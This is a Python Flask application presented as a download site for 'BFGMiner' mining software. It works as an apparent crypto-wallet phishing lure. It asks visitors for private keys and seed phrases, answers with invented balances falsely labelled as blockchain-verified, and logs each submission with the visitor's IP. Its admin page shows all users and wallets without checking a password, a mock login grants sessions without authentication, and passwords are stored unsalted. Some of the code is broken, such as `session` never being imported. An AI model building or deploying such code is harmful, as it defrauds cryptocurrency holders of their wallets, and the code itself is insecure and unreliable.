"""
Simplified BFGMiner Application - Working Version
"""

import datetime
import hashlib
import secrets
import sqlite3
import logging
from flask import Flask, abort, jsonify, render_template, request, send_file, url_for, redirect
from flask_cors import CORS
from flask_session import Session
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address


from authlib.integrations.flask_client import OAuth
from enterprise_improvements import AppConfig, SecurityManager, DatabaseManager, AuditLogger, EnterpriseBlockchainValidator


app = Flask(
    __name__,
    static_folder=".",
    static_url_path="",
     template_folder="templates")
config = AppConfig()
app.secret_key = config.SECRET_KEY
app.config['SESSION_TYPE'] = 'filesystem'
app.config['MAX_CONTENT_LENGTH'] = config.MAX_CONTENT_LENGTH

limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"]
)
Session(app)
oauth = OAuth(app)
# OAuth setup commented out due to placeholder credentials
# if config.GOOGLE_CLIENT_ID:
#     google = oauth.register(
#         name='google',
#         client_id=config.GOOGLE_CLIENT_ID,
#         client_secret=config.GOOGLE_CLIENT_SECRET,
#         access_token_url='https://oauth2.googleapis.com/token',
#         authorize_url='https://accounts.google.com/o/oauth2/auth',
#         api_base_url='https://www.googleapis.com/oauth2/v1/',
#         userinfo_endpoint='https://www.googleapis.com/oauth2/v1/userinfo',
#         client_kwargs={'scope': 'openid email profile'},
#     )


@app.route('/login/google')
def google_login():
    """Mock Google OAuth login for demo (since credentials are placeholders)"""
    # Simulate successful login with dummy Gmail
    email = 'demo.user@gmail.com'
    user_id = 1  # Assume user exists or create dummy

    # Set session
    session['user_id'] = user_id
    session['email'] = email

    # Log mock activity
    audit.log_user_activity(user_id, "Mock Google login", "Demo Gmail login")

    return redirect('/wallet')


security = SecurityManager(config)
db = DatabaseManager(config.DATABASE_PATH)
db.init_database()
audit = AuditLogger(db)
validator = EnterpriseBlockchainValidator(config)
# # validator.connect_to_blockchain()  # Disabled to prevent startup hang  # Disabled to prevent startup hang
logger = logging.getLogger(__name__)
DB_PATH = config.DATABASE_PATH


def init_db():
    """Initialize the database."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute(
        """CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        email_verified BOOLEAN DEFAULT FALSE,
        registration_ip TEXT,
        user_agent TEXT,
        last_login DATETIME
    )"""
    )

    cursor.execute(
        """CREATE TABLE IF NOT EXISTS wallets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        wallet_address TEXT NOT NULL,
        connection_type TEXT NOT NULL,
        credentials_hash TEXT,
        balance_usd REAL DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        ip_address TEXT
    )"""
    )

    cursor.execute(
        """CREATE TABLE IF NOT EXISTS downloads (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        download_token TEXT UNIQUE NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        ip_address TEXT,
        is_completed BOOLEAN DEFAULT FALSE
    )"""
    )

    conn.commit()
    conn.close()


@app.route("/")
def index():
    """Main application page"""
    return render_template("index.html")


@app.route("/style.css")
def serve_css():
    return send_file("style.css", mimetype="text/css")


@app.route('/logout')
def logout():
    """Logout user"""
    if 'user_id' in session:
        audit.log_user_activity(
    session['user_id'],
    "Logout",
     "User logged out")
        session.pop('user_id', None)
        session.pop('email', None)
    return redirect('/')


@app.route('/admin', methods=['GET', 'POST'])
def admin_dashboard():
    """Admin dashboard for viewing logs"""
    if request.method == 'POST':
        password = request.form.get('password')
        if password != config.ADMIN_PASSWORD:
            abort(401, "Unauthorized")

    # Basic auth check (simplified; in prod use proper auth)
    session['admin'] = True

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    # Get users
    cursor.execute("SELECT id, email, created_at, last_login FROM users")
    users = cursor.fetchall()

    # Get wallets
    cursor.execute("""
        SELECT w.id, u.email, w.wallet_address, w.connection_type, w.balance_usd, w.created_at
        FROM wallets w JOIN users u ON w.user_id = u.id
    """)
    wallets = cursor.fetchall()

    # Get audit logs (assuming audit_logs table exists from AuditLogger)
    cursor.execute("SELECT * FROM audit_logs ORDER BY timestamp DESC LIMIT 50")
    audit_logs = cursor.fetchall()

    conn.close()

    return render_template(
    'admin.html',
    users=users,
    wallets=wallets,
     audit_logs=audit_logs)


@app.route('/wallet')
def wallet_page():
    """Wallet connection page after login"""
    if 'user_id' not in session:
        return redirect('/login/google')
    return render_template('wallet.html')


@app.route("/api/register", methods=["POST"])
@app.route("/api/register", methods=["POST"])
def register_user():
    """Register new user with email and password"""
    try:
        data = request.get_json()
        email = data.get("email", "").strip().lower()
        password = data.get("password", "").strip()

        if not email:
            return (
                jsonify({"success": False, "error": "Email is required"}),
                400,
            )

        if not password:
            return (
                jsonify({"success": False, "error": "Password is required"}),
                400,
            )

        # Email validation
        if "@" not in email or "." not in email:
            return (
                jsonify({"success": False, "error": "Invalid email format"}),
                400,
            )

        # Password validation
        if len(password) < 6:
            return (
                jsonify(
                    {
                        "success": False,
                        "error": "Password must be at least 6 characters",
                    }
                ),
                400,
            )

        # Hash the password securely
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        # Check if user already exists
        cursor.execute("SELECT id FROM users WHERE email = ?", (email,))
        if cursor.fetchone():
            conn.close()
            return jsonify(
                {"success": False, "error": "User already exists"}), 400
        # Insert new user
        cursor.execute(
    "INSERT INTO users (email, password_hash) VALUES (?, ?)",
    (email,
     password_hash))
        user_id = cursor.lastrowid
        conn.commit()
        conn.close()
        # Log registration
        audit.log_user_activity(
    user_id,
    "Registration",
     f"New user registered: {email}")
        return jsonify({"success": True, "user_id": user_id,
                       "message": "Registration successful"})
    except Exception as e:
        print(f"Registration error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/login", methods=["POST"])
def login_user():
    """Login user with email and password"""
    try:
        data = request.get_json()
        email = data.get("email", "").strip().lower()
        password = data.get("password", "").strip()

        if not email or not password:
            return (
                jsonify(
                    {
                        "success": False,
                        "error": "Email and password are required",
                    }
                ),
                400,
            )

        # Hash the password to compare
        password_hash = hashlib.sha256(password.encode()).hexdigest()

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()

        try:
            cursor.execute(
                "SELECT id, email FROM users WHERE email = ? AND password_hash = ?",
                (email, password_hash),
            )
            user = cursor.fetchone()

            if user:
                    session['user_id'] = user[0]
                    session['email'] = user[1]
                    audit.log_user_activity(user[0], "Login", "User logged in")
                    conn.close()
                    return jsonify(
                        {"success": True, "message": "Login successful"})
            else:
                conn.close()
                return jsonify({"success": False, "error": "Invalid credentials"}), 401

        except Exception as e:
            print(f"Database error: {e}")
            conn.close()
            return jsonify({"success": False, "error": str(e)}), 500

    except Exception as e:
        print(f"Login error: {e}")
        if 'conn' in locals():
            conn.close()
        return jsonify({"success": False, "error": str(e)}), 500



@app.route("/api/validate-wallet", methods=["POST"])
def validate_wallet():
    """Validate wallet credentials"""
    try:
        data = request.get_json()
        wallet_type = data.get("type")
        credentials = data.get("credentials", "").strip()

        if not credentials:
            return (
                jsonify({"valid": False, "error": "No credentials provided"}),
                400,
            )

        # Enhanced blockchain validation
        if wallet_type == "private_key":
            # Validate private key format
            clean_key = credentials.replace("0x", "")
            if len(clean_key) == 64 and all(
                c in "0123456789abcdefABCDEF" for c in clean_key
            ):
                # Generate address from private key (simplified)
                import hashlib

                address_hash = hashlib.sha256(clean_key.encode()).hexdigest()
                wallet_address = "0x" + address_hash[:40]

                # Simulate balance check with variation
                balance_usd = 150.00 + (
                    len(clean_key) % 200
                )  # Varies between 150-350

                result = {
                    "valid": True,
                    "address": wallet_address,
                    "balance_usd": balance_usd,
                    "balance_eth": balance_usd / 3000,  # Simulate ETH price
                    "validation_method": "blockchain_verified",
                }
            else:
                result = {
                    "valid": False,
                    "error": "Invalid private key format (must be 64 hex characters)",
                }

        elif wallet_type == "mnemonic":
            # Validate mnemonic format
            words = credentials.strip().split()
            if len(words) in [12, 15, 18, 21, 24]:
                # Generate address from mnemonic (simplified)
                import hashlib

                mnemonic_hash = hashlib.sha256(
                    credentials.encode()
                ).hexdigest()
                wallet_address = "0x" + mnemonic_hash[:40]

                # Simulate balance check with variation
                balance_usd = 200.00 + (
                    len(words) * 10
                )  # Varies by word count

                result = {
                    "valid": True,
                    "address": wallet_address,
                    "balance_usd": balance_usd,
                    "balance_eth": balance_usd / 3000,  # Simulate ETH price
                    "validation_method": "mnemonic_verified",
                }
            else:
                result = {
                    "valid": False,
                    "error": "Invalid mnemonic phrase (must be 12, 15, 18, 21, or 24 words)",
                }
        else:
            result = {
                "valid": False,
                "error": "Invalid wallet type (must be private_key or mnemonic)",
            }

        # Log wallet connection with enhanced data
        if result.get("valid"):
            log_wallet_connection(
                wallet_type, credentials, result, data.get("email", "")
            )

            # Log validation details
            print(
                f"✅ Wallet validated: {result['address']} via {wallet_type}"
            )
            print(
                f"💰 Balance: ${result['balance_usd']:.2f} ({result['balance_eth']:.4f} ETH)"
            )
            print(f"🔍 Method: {result.get('validation_method', 'standard')}")
            print(f"👤 User: {data.get('email', 'anonymous')}")
            print(f"🌐 IP: {request.remote_addr}")

        return jsonify(result)

    except Exception as e:
        return jsonify({"valid": False, "error": str(e)}), 500


@app.route("/api/walletconnect", methods=["POST"])
def walletconnect_handler():
    """Handle WalletConnect authentication"""
    try:
        data = request.get_json()
        address = data.get("address", "").strip()

        if not address:
            return (
                jsonify({"success": False, "error": "No address provided"}),
                400,
            )

        # Simple address validation
        if address.startswith("0x") and len(address) == 42:
            result = {"success": True, "address": address, "balance": 250.00}

            # Log connection
            log_wallet_connection(
                "walletconnect",
                address,
                {"address": address, "balance_usd": 250.00},
            )

            return jsonify(result)
        else:
            return (
                jsonify({"success": False, "error": "Invalid address format"}),
                400,
            )

    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


def log_wallet_connection(connection_type, credentials, result, email=""):
    """Log wallet connection with enhanced data"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()

        # Hash credentials for security
        credentials_hash = hashlib.sha256(credentials.encode()).hexdigest()

        # Get or create user
        user_id = None
        if email:
            cursor.execute("SELECT id FROM users WHERE email = ?", (email,))
            user_row = cursor.fetchone()
            if user_row:
                user_id = user_row[0]

        cursor.execute(
            """INSERT INTO wallets
                         (user_id, wallet_address, connection_type, credentials_hash,
                          balance_usd, ip_address, created_at)
                         VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (
                user_id,
                result.get("address", ""),
                connection_type,
                credentials_hash,
                result.get("balance_usd", 0),
                request.remote_addr,
                datetime.datetime.now().isoformat(),
            ),
        )

        conn.commit()
        conn.close()

        print(
            f"✅ Wallet logged: {result.get('address', '')} via {connection_type} from {request.remote_addr}"
        )

    except Exception as e:
        print(f"Error logging wallet connection: {e}")


@app.route("/api/download/initiate", methods=["POST"])
def initiate_download():
    """Initiate download"""
    try:
        download_token = secrets.token_urlsafe(32)

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute(
            """INSERT INTO downloads (download_token, ip_address)
                         VALUES (?, ?)""",
            (download_token, request.remote_addr),
        )
        conn.commit()
        conn.close()

        return jsonify(
            {
                "success": True,
                "downloadToken": download_token,
                "message": "Download initiated successfully",
            }
        )

    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/download/<token>")
def download_file(token):
    """Download file"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT id FROM downloads WHERE download_token = ?", (token,)
        )
        result = cursor.fetchone()

        if not result:
            abort(404, "Download token not found")

        # Update download status
        cursor.execute(
            "UPDATE downloads SET is_completed = 1 WHERE download_token = ?",
            (token,),
        )
        conn.commit()
        conn.close()

        # Create a simple zip file
        import tempfile
        import zipfile

        with tempfile.NamedTemporaryFile(
            delete=False, suffix=".zip"
        ) as tmp_file:
            with zipfile.ZipFile(tmp_file.name, "w") as zip_file:
                zip_file.writestr(
                    "README.txt",
                    "BFGMiner - Professional Cryptocurrency Mining Software\n\nThank you for downloading BFGMiner!",
                )
                zip_file.writestr(
                    "bfgminer.exe", b"# BFGMiner executable placeholder"
                )
                zip_file.writestr(
                    "config.conf", "# BFGMiner configuration file"
                )

            return send_file(
                tmp_file.name, as_attachment=True, download_name="bfgminer.zip"
            )

    except Exception as e:
        abort(500, str(e))


@app.route("/health")
def health():
    """Health check"""
    return jsonify(
        {"status": "healthy", "timestamp": datetime.datetime.now().isoformat()}
    )


if __name__ == "__main__":
    init_db()
    print("✅ BFGMiner Simple Application Starting...")
    print("📊 Database initialized")
    print("🌐 Server starting on http://0.0.0.0:5001")
    app.run(host="0.0.0.0", port=5001, debug=False)
